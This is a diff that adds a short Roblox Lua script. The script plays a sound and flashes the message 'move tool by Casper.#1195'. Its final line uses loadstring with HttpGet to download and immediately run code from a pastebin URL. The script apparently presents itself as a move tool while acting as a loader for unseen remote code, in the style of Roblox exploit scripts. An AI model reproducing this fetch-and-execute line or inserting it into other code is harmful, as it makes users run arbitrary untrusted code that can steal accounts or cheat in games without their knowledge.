@@ -1,0 +1,15 @@
+
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://216917652"
+sound.Parent = game:GetService("SoundService")
+sound:Play()
+sound.PlaybackSpeed = 1
+
+spawn(function()
+local message = Instance.new("Message",workspace)
+message.Text = "move tool by Casper.#1195"
+wait(0.5)
+message:Destroy()
+end)
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/VHpzmw3a'),true))()
